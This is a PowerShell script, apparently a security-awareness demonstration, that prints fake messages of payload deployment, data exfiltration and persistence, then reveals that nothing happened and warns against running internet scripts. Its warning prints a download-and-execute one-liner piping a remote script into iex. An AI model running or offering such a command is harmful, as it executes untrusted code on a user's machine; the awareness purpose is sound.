# HARMLESS AWARENESS SCRIPT - Does absolutely nothing dangerous
Clear-Host

$RED = "Red"
$GREEN = "Green"
$YELLOW = "Yellow"
$CYAN = "Cyan"
$WHITE = "White"

# Fake "scanning" phase
Write-Host "[" -NoNewline -ForegroundColor White
Write-Host "SYSTEM" -NoNewline -ForegroundColor Red
Write-Host "] Initializing remote payload executor..." -ForegroundColor White
Start-Sleep -Milliseconds 800

Write-Host "[" -NoNewline -ForegroundColor White
Write-Host "NETWORK" -NoNewline -ForegroundColor Yellow
Write-Host "] Establishing encrypted tunnel to 192.168.4.231..." -ForegroundColor White
Start-Sleep -Milliseconds 600

Write-Host "[" -NoNewline -ForegroundColor White
Write-Host "SUCCESS" -NoNewline -ForegroundColor Green
Write-Host "] Connection established. Bypassing Windows Defender..." -ForegroundColor White
Start-Sleep -Milliseconds 900

Write-Host ""
Write-Host "Scanning system directories..." -ForegroundColor Cyan

# Fake directory scan
$fakePaths = @(
    "C:\Users\$env:USERNAME\Documents",
    "C:\Users\$env:USERNAME\Desktop",
    "C:\Users\$env:USERNAME\AppData\Roaming",
    "C:\Windows\System32",
    "C:\Program Files",
    "C:\Program Files (x86)"
)

foreach ($path in $fakePaths) {
    Write-Host "  >> Scanning $path" -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 300
}

Write-Host ""
Write-Host "[" -NoNewline
Write-Host "WARNING" -NoNewline -ForegroundColor Red
Write-Host "] Sensitive data found. Preparing exfiltration package..." -ForegroundColor White
Start-Sleep -Milliseconds 700

# Fake progress bar
Write-Host ""
Write-Host "Uploading data: " -NoNewline -ForegroundColor White
$bar = ""
for ($i = 1; $i -le 20; $i++) {
    $bar += "#"
    $percent = $i * 5
    Write-Host "`r  [" -NoNewline -ForegroundColor White
    Write-Host $bar.PadRight(20) -NoNewline -ForegroundColor Red
    Write-Host "] $percent%" -NoNewline -ForegroundColor Yellow
    Start-Sleep -Milliseconds 200
}

Write-Host ""
Write-Host ""
Write-Host "[" -NoNewline
Write-Host "DONE" -NoNewline -ForegroundColor Green
Write-Host "] Payload deployed. Persistence mechanism installed." -ForegroundColor White
Start-Sleep -Milliseconds 500
Write-Host "[" -NoNewline
Write-Host "DONE" -NoNewline -ForegroundColor Green
Write-Host "] Registry keys modified. Startup entry created." -ForegroundColor White
Start-Sleep -Milliseconds 500
Write-Host "[" -NoNewline
Write-Host "DONE" -NoNewline -ForegroundColor Green
Write-Host "] Logs cleared. Covering tracks..." -ForegroundColor White

Start-Sleep -Seconds 2

# THE REVEAL
Clear-Host
Write-Host ""
Write-Host "  ============================================" -ForegroundColor Cyan
Write-Host "         CYBERSECURITY AWARENESS MESSAGE      " -ForegroundColor Yellow
Write-Host "  ============================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "  You just ran a script from the internet." -ForegroundColor White
Write-Host "  NOTHING harmful actually happened." -ForegroundColor Green
Write-Host ""
Write-Host "  BUT -- if this had been a real malicious script," -ForegroundColor White
Write-Host "  your files, passwords, and accounts could" -ForegroundColor Red
Write-Host "  have been compromised in those same seconds." -ForegroundColor Red
Write-Host ""
Write-Host "  Commands like:" -ForegroundColor White
Write-Host "    irm https://somesite.com/script.ps1 | iex" -ForegroundColor Yellow
Write-Host ""
Write-Host "  ...execute WHATEVER code that URL serves." -ForegroundColor White
Write-Host "  No prompts. No warnings. No second chances." -ForegroundColor White
Write-Host ""
Write-Host "  STAY SAFE:" -ForegroundColor Cyan
Write-Host "   * Never run scripts you don't understand" -ForegroundColor White
Write-Host "   * Always read the source before executing" -ForegroundColor White
Write-Host "   * Verify the domain belongs to who you trust" -ForegroundColor White
Write-Host ""
Write-Host "  -- Awareness initiative by subigya.com --" -ForegroundColor DarkGray
Write-Host ""
